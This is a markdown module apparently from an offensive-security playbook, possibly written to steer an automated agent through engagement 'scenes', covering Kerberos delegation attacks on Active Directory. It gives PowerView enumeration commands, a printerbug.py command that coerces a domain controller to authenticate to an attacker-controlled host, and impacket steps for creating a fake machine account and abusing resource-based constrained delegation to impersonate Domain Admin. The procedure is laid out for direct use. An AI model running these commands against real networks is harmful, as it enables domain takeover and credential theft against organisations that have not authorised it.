# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: Delegation Attacks

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Delegation Attacks

| Delegation Type | Attack Vector | Prerequisites | Impact |
|---|---|---|---|
| **Unconstrained** | Extract TGTs from LSASS of the delegation host when a privileged user authenticates to it | Local admin on unconstrained delegation host; OR force authentication (Printer Bug, PetitPotam) | Capture TGT of any user including Domain Admin |
| **Constrained (S4U2Proxy)** | Request service ticket for ANY service as ANY user (if allowed to delegate) | Service account hash with constrained delegation; know the allowed services | Impersonate any user to specified services |
| **Resource-Based Constrained (RBCD)** | Configure a machine account to delegate to a target | GenericWrite/WriteProperty on target computer object; ability to create/control a machine account (default: 10 per user via ms-DS-MachineAccountQuota) | Impersonate any user to target computer |

**Enumerate delegation**:
```powershell
# PowerView
Get-DomainComputer -Unconstrained           # unconstrained delegation hosts
Get-DomainUser -TrustedToAuth               # constrained delegation users
Get-DomainComputer -TrustedToAuth           # constrained delegation computers

# RBCD: check msDS-AllowedToActOnBehalfOfOtherIdentity on computer objects
Get-DomainComputer <target> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Unconstrained delegation + Printer Bug**: If you control a host with unconstrained delegation, force a Domain Controller to authenticate to it via MS-RPRN (Printer Bug):
```bash
# From Linux
impacket-rpcdump @<target_dc> | grep -A5 "MS-RPRN"
python3 printerbug.py <domain>/<user>:<password>@<target_dc> <attacker_unconstrained_host>
```
The DC's machine account TGT will be cached in LSASS of your unconstrained host. Extract and use.

**Resource-Based Constrained Delegation attack steps**:
1. Create a machine account: `impacket-addcomputer <domain>/<user>:<pass> -computer-name 'FAKE$' -computer-pass 'Passw0rd!'`
2. Set RBCD: configure `msDS-AllowedToActOnBehalfOfOtherIdentity` on target to allow the fake machine
3. Impersonate: use S4U2Self + S4U2Proxy to get a service ticket to the target as any user (including Domain Admin)
4. Access the target with the impersonated ticket

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).

## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
